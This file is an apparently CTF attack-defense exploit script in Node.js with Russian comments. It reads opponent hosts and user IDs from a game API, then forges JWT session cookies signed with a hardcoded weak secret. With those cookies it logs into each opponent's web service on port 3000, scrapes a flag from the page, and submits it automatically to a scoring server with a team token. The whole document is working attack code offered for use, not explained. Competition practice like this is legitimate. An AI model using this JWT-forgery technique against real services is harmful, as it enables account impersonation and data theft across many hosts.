import fetch from "node-fetch"; // Убедись что установлен: npm install node-fetch
import jwt from "jsonwebtoken"; // Убедись что установлен: npm install jsonwebtoken
import { JSDOM } from "jsdom";   // Убедись что установлен: npm install jsdom

const API_URL = "http://10.10.10.10/api/client/attack_data/";
const SECRET = "i-am-so-secret"; 

async function getUsers() {
  const res = await fetch(API_URL);
  if (!res.ok) throw new Error(`Ошибка запроса к API: ${res.status}`);
  const data = await res.json();
  return data.duels;
}

function generateToken(username) {
  return jwt.sign({ username }, SECRET);
}

async function getFlag(url, token) {
  try {
    const res = await fetch(url, {
      headers: {
        "Cookie": `session=${token}`,
      },
    });

    if (!res.ok) {
      console.error(`Ошибка запроса на ${url}: ${res.status}`);
      return;
    }

    const text = await res.text();
    const dom = new JSDOM(text);
    const spans = dom.window.document.querySelectorAll("span");

    for (let i = 0; i < spans.length; i++) {
      if (spans[i].textContent.trim().toLowerCase() === "strategy") {
        const next = spans[i].nextElementSibling;
        if (next && next.tagName.toLowerCase() === "span") {
          console.log(`[+] Флаг с ${url}: ${next.textContent.trim()}`);
          const flag = next.textContent.trim();
          const res = await fetch("http://10.10.10.10/flags", {
            method: "PUT",
            headers: {
              "Content-Type": "application/json",
              "X-Team-Token": "cc7f5de9678975e2",
            },
            body: JSON.stringify([flag]),
          });

          console.log(res.statusText);
          return
        }
      }
    }

    console.warn(`[-] Флаг не найден на ${url}`);
  } catch (error) {
    console.error(`Ошибка обработки ${url}:`, error.message);
  }
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

(async () => {
  try {
    const users = await getUsers();

    const excluded_hosts = [
      "10.80.5.2",
      "10.80.12.2",
      "10.80.9.2",
      "10.80.4.2"
    ]; // <-- сюда добавляй хосты, которые нужно исключить

    users[Symbol.iterator] = function* () {
      for (const k in this) {
        yield [k, this[k]];
      }
    };

    const tasks = [];

    for (const [host, userIds] of users) {
      if (excluded_hosts.includes(host)) {
        console.log(`[-] Хост ${host} исключен из обработки`);
        continue; // пропускаем этот хост
      }

      for (const userId of userIds) {
        tasks.push({ host, userId });
      }
    }

    for (const task of tasks) {
      const { host, userId } = task;
      // console.log(`${host}:${userId}`);
      
      const token = generateToken(userId);

      await getFlag(`http://${host}:3000`, token);
      await sleep(500);
    }

  } catch (error) {
    console.error("Ошибка выполнения скрипта:", error.message);
  }
})();